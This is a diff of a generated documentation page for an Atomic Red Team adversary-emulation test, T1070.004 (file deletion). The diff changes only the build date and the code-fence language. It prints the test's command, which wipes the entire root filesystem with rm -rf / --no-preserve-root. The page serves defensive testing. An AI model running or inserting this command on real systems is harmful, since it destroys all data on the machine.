@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1070.004"
 attack_technique_name: "Indicator Removal on Host: File Deletion"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "f3aa95fe-4f10-4485-ad26-abf22a764c52"
@@ -42,7 +42,7 @@ This test deletes the entire root filesystem of a Linux system. This technique w
 
 ### Command
 
-```sh
+```bash
 [ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
 ```
 
